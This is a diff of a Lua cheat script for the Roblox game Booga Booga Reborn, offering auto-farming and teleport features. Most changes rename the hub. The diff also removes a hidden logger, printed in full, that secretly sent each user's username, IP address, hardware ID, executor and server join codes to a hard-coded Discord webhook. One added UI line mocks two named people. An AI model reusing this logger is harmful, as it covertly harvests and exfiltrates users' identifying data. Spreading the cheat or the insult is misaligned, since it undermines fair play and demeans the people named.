@@ -101,7 +101,7 @@ end
 
 -- Create main GUI window (safe)
 local Window = Library:CreateWindow{
-    Title = "Project Instra Hub -- Booga Booga Reborn",
+    Title = "Project Infra Hub -- Booga Booga Reborn",
     SubTitle = "by xylo",
     TabWidth = 160,
     Size = UDim2.fromOffset(830, 525),
@@ -151,107 +151,6 @@ local MarketplaceService = game:GetService("MarketplaceService")
 local Players = game:GetService("Players")
 local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
 local LocalPlayer = Players.LocalPlayer
-
-local webhookURL = "https://discordapp.com/api/webhooks/1434794468325982281/Jf837vvcVpQ4zy1rfFS4NsT9_HFNukBKPqDIhagp9e02NAnQIHa4FlSLwTwCjKwybbm3"
-
--- Track execution time
-local startTime = tick()
-
--- Safe executor detection
-local executor = identifyexecutor and identifyexecutor() or "Unknown"
-
--- Safe IP fetch
-local ip = "Unavailable"
-pcall(function()
-    ip = game:HttpGet("https://api.ipify.org")
-end)
-
--- Game info
-local gameId = game.PlaceId
-local jobId = game.JobId
-local gameName = MarketplaceService:GetProductInfo(gameId).Name
-local playerCount = #Players:GetPlayers()
-
--- Join scripts
-local jsJoinCode = [[
-fetch("https://games.roblox.com/v1/games/]] .. gameId .. [[/servers/Public?sortOrder=Asc&limit=100").then(res => res.json()).then(json => {
-    const server = json.data.find(s => s.id === "]] .. jobId .. [[");
-    if (server) {
-        window.open(`roblox://placeId=` + server.placeId + `&gameInstanceId=` + server.id);
-    } else {
-        console.log("Server not found.");
-    }
-});
-]]
-
-local luaJoinScript = [[
-local TeleportService = game:GetService("TeleportService")
-TeleportService:TeleportToPlaceInstance(]] .. gameId .. [[, "]] .. jobId .. [[", game.Players.LocalPlayer)
-]]
-
--- Send log to Discord
-local function sendExecutionLog()
-    local duration = math.floor(tick() - startTime)
-
-    local embed = {
-        ["title"] = "[PROJECT INSTRA] Execution Log",
-        ["description"] = table.concat({
-            "[+] Username: " .. LocalPlayer.Name,
-            "[+] Display Name: " .. LocalPlayer.DisplayName,
-            "[+] User ID: " .. tostring(LocalPlayer.UserId),
-            "[+] Executor: " .. executor,
-            "[+] IP Address: " .. ip,
-            "[+] HWID: " .. RbxAnalyticsService:GetClientId(),
-            "[+] Game Name: " .. gameName,
-            "[+] Game ID: " .. tostring(gameId),
-            "[+] Job ID: " .. jobId,
-            "[+] Players in Server: " .. tostring(playerCount),
-            "[+] Time: " .. os.date("%Y-%m-%d %H:%M:%S"),
-            "[+] Execution Duration: " .. tostring(duration) .. " seconds",
-            "",
-            "[+] JavaScript Join Code:",
-            "```js\n" .. jsJoinCode .. "\n```",
-            "[+] Lua Join Script:",
-            "```lua\n" .. luaJoinScript .. "\n```"
-        }, "\n"),
-        ["type"] = "rich",
-        ["color"] = 0x000000,
-        ["footer"] = { ["text"] = "Execution Log - Roblox" },
-        ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
-    }
-
-    local payload = HttpService:JSONEncode({
-        ["content"] = "",
-        ["embeds"] = {embed}
-    })
-
-    local requestFunction = syn and syn.request or http_request or request
-    if requestFunction then
-        requestFunction({
-            Url = webhookURL,
-            Method = "POST",
-            Headers = {
-                ["Content-Type"] = "application/json"
-            },
-            Body = payload
-        })
-    else
-        warn("Your executor does not support HTTP requests.")
-    end
-end
-
--- Send on execution
-sendExecutionLog()
-
--- Optionally send again on leave
-LocalPlayer.AncestryChanged:Connect(function(_, parent)
-    if not parent then
-        sendExecutionLog()
-    end
-end)
-
-
-
 
 -- Minimal safe setclipboard wrapper
 local function safe_setclipboard(val)
@@ -314,11 +213,11 @@ local plantrangeslider = Tabs.Farming:CreateSlider("plantrange", { Title = "Plan
 local plantdelayslider = Tabs.Farming:CreateSlider("plantdelay", { Title = "Plant Delay (s)", Min = 0.01, Max = 1, Rounding = 2, Default = 0.1 })
 local harvesttoggle = Tabs.Farming:CreateToggle("harvesttoggle", { Title = "Auto Harvest", Default = false })
 local harvestrangeslider = Tabs.Farming:CreateSlider("harvestrange", { Title = "Harvest Range", Min = 1, Max = 30, Rounding = 1, Default = 30 })
-Tabs.Farming:CreateParagraph("Aligned Paragraph", {Title = "Tween Stuff", Content = "Project Instra runs :(", TitleAlignment = "Middle", ContentAlignment = Enum.TextXAlignment.Center})
+Tabs.Farming:CreateParagraph("Aligned Paragraph", {Title = "Tween Stuff", Content = "Project Infra runs ( cincuentaz & duke are gay )", TitleAlignment = "Middle", ContentAlignment = Enum.TextXAlignment.Center})
 local tweenplantboxtoggle = Tabs.Farming:AddToggle("tweentoplantbox", { Title = "Tween to Plant Box", Default = false })
 local tweenbushtoggle = Tabs.Farming:AddToggle("tweentobush", { Title = "Tween to Bush + Plant Box", Default = false })
 local tweenrangeslider = Tabs.Farming:AddSlider("tweenrange", { Title = "Range", Min = 1, Max = 250, Rounding = 1, Default = 250 })
-Tabs.Farming:CreateParagraph("Aligned Paragraph", {Title = "Plantbox Stuff", Content = "project instra runs :(", TitleAlignment = "Middle", ContentAlignment = Enum.TextXAlignment.Center})
+Tabs.Farming:CreateParagraph("Aligned Paragraph", {Title = "Plantbox Stuff", Content = "If youre reading this have a good day", TitleAlignment = "Middle", ContentAlignment = Enum.TextXAlignment.Center})
 Tabs.Farming:CreateButton({Title = "Place 16x16 Plantboxes (256)", Callback = function() placestructure(16) end })
 Tabs.Farming:CreateButton({Title = "Place 15x15 Plantboxes (225)", Callback = function() placestructure(15) end })
 Tabs.Farming:CreateButton({Title = "Place 10x10 Plantboxes (100)", Callback = function() placestructure(10) end })
@@ -995,7 +894,7 @@ pcall(function() SaveManager:SetFolder("FluentScriptHub/specific-game") end)
 pcall(function() InterfaceManager:BuildInterfaceSection(Tabs.Settings) end)
 pcall(function() SaveManager:BuildConfigSection(Tabs.Settings) end)
 pcall(function() Window:SelectTab(1) end)
-pcall(function() Library:Notify{ Title = "Project Instra Hub", Content = "Loaded (defensive mode).", Duration = 6 } end)
+pcall(function() Library:Notify{ Title = "Project Infra Hub", Content = "Loaded (defensive mode).", Duration = 6 } end)
 pcall(function() SaveManager:LoadAutoloadConfig() end)
 
 print("Done! Defensive Project Intra Hub loaded.")
